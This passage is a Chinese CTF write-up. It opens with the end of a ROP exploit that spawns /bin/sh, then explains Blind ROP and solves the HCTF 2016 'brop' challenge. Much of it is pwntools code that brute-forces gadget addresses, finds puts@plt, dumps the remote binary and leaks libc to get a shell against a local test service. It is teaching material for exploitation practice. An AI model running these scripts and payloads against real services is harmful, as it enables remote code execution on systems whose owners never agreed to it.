    payload += struct.pack("&lt;I", 0x22222222)
    payload += struct.pack("&lt;I", 0x22222222)
    payload += pack_addr(0x0804961a, "pop edx; pop ecx; pop ebx; ret")
    payload += pack_addr(0x080485f9, "NULL")    # environ
    payload += pack_addr(0x080485f9, "NULL")    # argv
    payload += struct.pack("&lt;I", 0x22222222)
    # Now we use this neat gadget, /bin/sh is right after us.
    payload += pack_addr(0x0804875b, "lea ebx, [esp+4]; int 0x80")
    payload += pack_addr(0x08048a11, "pop; pop; ret")
    payload += b"/bin/shx00"
    payload += struct.pack("&lt;I", 0x44444444)    # eip, too lazy for clean exit.
    payload = payload.ljust(100, b"xcc")
    # Ok, sanity check and good to go.
    assert len(payload) &lt;= 100, "payload too large, %d bytes." % len(payload)
    target.send(payload)
    skip(target, b"F.U.C.K.U.P.")
    target.set_inheritable(True)
    print("You should be able to type stuff now.")
    os.system("socat STDIO FD:%d" % target.fileno())
```

<br>

**BROP**

前两天在360安全客看到了一篇文章，《格式化字符串blind pwn详细教程》，看了下内容，大概就是教我们如何利用格式化串漏洞dump 程序，但是在二进制漏洞中，以及CTF Pwn题型中，还有一种考点？说利用方式吧，叫Bind ROP。对于这些相关的东西，我们其实可以在浏览器搜索到，比如K0师傅[《BROP Attack之Nginx远程代码执行漏洞分析及利用》](http://bobao.360.cn/learning/detail/3415.html)，以及mctrain前辈在wooyun社区发布的《Blind Return Oriented Programming (BROP) Attack – 攻击原理》。其实都能很详细看到了解BROP的攻击原理，以及攻击样例。

当然这个也是《 基础栈溢出及其利用方式的》系列的一部分。

<br>

**什么是BROP**

那么我也只是在这里尽量让大家先明白，什么是BORP，以及BROP的攻击原理，以及在后面放一个最近CTF中，及HCTF –出题人跑路了的PWN题的详细分析。

BROP 原文：[Blind Return Oriented Programming (BROP) Website](http://www.scs.stanford.edu/brop/)

其核心要义就是，通过ROP的方法，远程攻击一个应用程序，劫持程序控制流程。其难点在于，我们并没有程序的源代码以及二进制程序。

详细的东西，我也不想再继续搬了，mctrain在文章讲得已经非常不错了，我在这里提供我的drop地址，不过大家少用阿，这玩意儿吃流量 [Blind Return Oriented Programming (BROP) Attack – 攻击原理](http://wooyun.bestwing.top:5000/static/drops/tips-3071.html)

<br>

**大概总结下**

看了 Drops的文章，我们大概可总结一下攻击流程

如果有Canary 防护，需要通过brute-force暴力破解或者 作者提出的方法“stack reading”

寻找stop gadget或者叫 hang gadget，这gadgaet使得程序进入了无限循环，并且hang，使得攻击者保持连接状态。（如blocking的系统调用 sleep)

寻找可以利用的，即potentially useful gadgets。这里指useful指的是具有某些功能，并不会造成crash的gadget

远程dump内存，（当然如果有格式化串，可以利用那也简便狠多，可以参考安全客文章《格式化字符串blind pwn详细教程》），如果没有，我们可能需要一个write的系统调用，传入一个socket文件描述符。

```
write(int sock,void *buf,int len)
```

转化成4条汇编指令就是



```
pop %rdi ret
pop %rsi ret
pop %rdx ret
call write ret
```

依次对应的是 %rdi-&gt;sock %rsi-&gt;buf %rdx-&gt;len

在栈上构造好这个四个gadget的内存地址，依次执行顺序调用就可以了（这当然是在我们解决掉Canary之后）

在dump 内存的过程中，pop %rdx ret这样的gadget也许不容易找到，所以作者又提出另一种方法，利用 strcmp函数，达到相同效果

所以之后的任务是：

寻找BROP Gadget（注:什么是BROP Gadget 可在Drops仔细阅读）

找到对用PLT项

<br>

**HCTF 之 出题人失踪了 (brop)**

了解了，攻击流程，以及攻击方法，我们就可以尝试做这个题目了。杭电的师傅已经，把源码公开在github上了。我们可以自己拿下来编译一下。

**已知信息**

比赛的时候，题目给了ip和端口 其他任何信息都没有。但是后面给出了bof的buffer大小作为提示。



```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

而且题目没有开Canary防护，所以我们并不需要突破Canary

经过测试，当输入的字符超过72字节，程序就不会再打印 No password, No game了。

<br>

**首先寻找 stop gadget**

这个地方，muhe师傅交了我一种方法，那就是利用pwntools的异常处理来检测。因为我们需要return address指向一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态。于是，我们把这种类型的gadget，成为stop gadget，这种gadget对于寻找其他gadgets取到了至关重要的作用。



```
from pwn import *
io = remote("127.0.0.1",10002)
def log_in_file(addr):
    #f = open("gadgets.txt",'a')
    #f = open('res.txt','a')
    f = open('puts.txt','a')
    f.write("the addr:0x%xn"%addr)
    f.close()
def find_stop_gadget(addr):
    io = remote("127.0.0.1",10002)
    payload = "A"*72 + p64(addr)
    io.recvuntil("WelCome my friend,Do you know password?")
    io.sendline(payload)
    try:
        io.recvline()
        if(io.recv()!=None):
            log.info("alie! at 0x%x" %addr)
            log_in_file(addr)
            io.close()
    except EOFError as e:
            io.close()
            log.info("the connection is close at 0x%x" %addr)
start = 0x400000
while True:
    start +=1
    print "[*] Rand:{0}".format(start)
    find_stop_gadget(start)
    if start &gt;0x40300000:
        break
```

可能会得到多个gadget，找个好用的就可以了。

<br>

**找useful gadget**

由于这个题目实质是调用puts函数，不是write函数，所以我们并不需要三个gadget，只需要1个 pop rdi;ret就足够了

%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数。。。

那么如何得到一个 pop rdi;ret呢？我们设想，在64位的ELF中，通常存在一个pop r15;ret 对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。

如果有存在一个地址 addr，满足



```
Payload1 = 'a'*72 + l64(addr-1)+l64(0)+l64(ret) 
Payload2 = 'a'*72 + l64(addr)+l64(0)+l64(ret) 
Payload3 = 'a'*72 + l64(addr+1) +l64(ret)
```

ret是一个返回函数，且有输出信息。那么我们就可以得到addr，即pop rdi;ret

在64位ELF中，通常存在一个pop r15；ret，对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。

如果addr就是指向的5f，那么addr-1就是指向41，Payload1 = 'a'72 + l64(addr-1)+l64(0)+l64(0x400711) ，41和5f组成一个指令，pop r15出来，后面接返回地址0x400711，栈平衡满足要求。Payload2 = 'a'72 + l64(addr)+l64(0)+l64(0x400711) ，pop rdi出来，也能正常返回。Payload3 = 'a'*72 + l64(addr+1) +l64(0x400711) ，addr+1指向c3即ret，直接返回后返回0x400711

于是，我先去寻找这么一个ret，返回有输出信息。



```
def ret_addr(addr):
    io = remote("127.0.0.1",10002)
    payload = 'A'*72 +p64(addr) + p64(stop_gadget)
    io.recvuntil("WelCome my friend,Do you know password?")
    io.sendline(payload)
    try:
        io.recvline()
        if (io.recv()!=None):
            print io.recv()
        # if "No password, no game" in io.recv():
            io.info("find gadgets at 0x%x" % addr)
            log_in_file(addr)
            print "[*] the ret addr at 0x%x" % (addr)
            io.close()
    except EOFError as e:
        io.close()
        log.info("the connection is close at 0x%x" %addr)
start = 0x400000
count = 0
while True:
    start += 1
    ret_addr(start)
    count += 1
    if count &gt;0x1000:
        break
```

有了 ret，于是我可以开始寻找 pop rdi;ret了。



```
def get_useful_gadget(addr):
    io = remote("127.0.0.1",10002)
    payload1 = 'A'*72 +p64(addr-1) + p64(0)+p64(ret)+p64(stop_gadget)
    payload2 = 'A'*72 +p64(addr) + p64(0)+p64(ret)+p64(stop_gadget)
    payload3 = 'A'*72 +p64(addr+1) +p64(ret)+p64(stop_gadget)
    io.recvuntil("WelCome my friend,Do you know password?")
    try:
        io.sendline(payload1)
        if io.recvuntil("WelCome my friend,Do you know password?"):
            io.sendline(payload2)
            if io.recvuntil("WelCome my friend,Do you know password?"):
                io.sendline(payload3)
                if io.recvuntil("WelCome my friend,Do you know password?"):
                    io.info("find gdgets at 0x%x" % addr)
                    log_in_file(addr)
                    io.close()
    except EOFError as e:
        io.close()
        log.info("the connection is close at 0x%x" %addr)
start = 0x400000
# count = 0
while True:
    start += 1
    get_useful_gadget(start)
```

找到pop rdi;ret了 ，gadget 的需求我们达到了。

<br>

**dump 程序**

照理，这个时候我们应该可以开始dump程序了，但是紧接着一个问题来了，我们不知道put_plt的地址。我们知道，puts函数能打印字符串，于是我们设想构造一个payload来验证得到的是不是puts_plt的地址，例如

```
payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

如果打印前四个字符为 x7fELF，则addr为puts_plt。

我找到的是 pop_rdi_ret = 0x4005d6

有了 gadget 和put_plt，我们就可以着手dump程序了。

首先我们需要构造一个leak的函数：

```
payload = 'a'*72 + p64(pop_rdi_ret) +p64(addr) + p64(puts_plt) +p64(stop_gadget)
```

这样就可以开始leak，但是还有一个问题，如果对一个x00的地址进行leak，返回是没有结果的，因此如果返回没有结果，我们就可以确定这个地址的值为x00，所以可以设置为x00然后将地址加1进行dump。

所以我们需要一个判断：



```
if data == '':
    data = 'x00'
```

基本这样，我们就可以dump文件了，当文件dump下来以后，我们就能很容易的得到一些got信息，那样我们可以更容易的去起shell

只要分别从0x400000和0x600000开始dump就可以。

<br>

**leak 获取libc**

当我们已经获取了got表信息后，那么我就可以进一步去leak函数，用search_Libc或者自己收集的libc 库查找相应的libc。那么我就可以进一步查询偏移，就可以构造payload 起shell了。

leak payload 也是相似的，就不重复了。

当然，我们这里也可以利用Pwntools的工具 Dynelf 来leak查询system地址，然后找一个地址写入/bin/shx00。

最后一步就可以起shell了。

剩下的内容基本和我们一般的leak info 题目是一样的。

与我前面的文章，PlaidCTF 2013: ropasaurusrex的利用方式基本相同，由于篇幅原因就不继续写下去了。

<br>

**参考链接**

HCTF 源码 [https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c](https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c) 

muhe博客 [http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/](http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/) 

以及队内 师傅的Writeup 
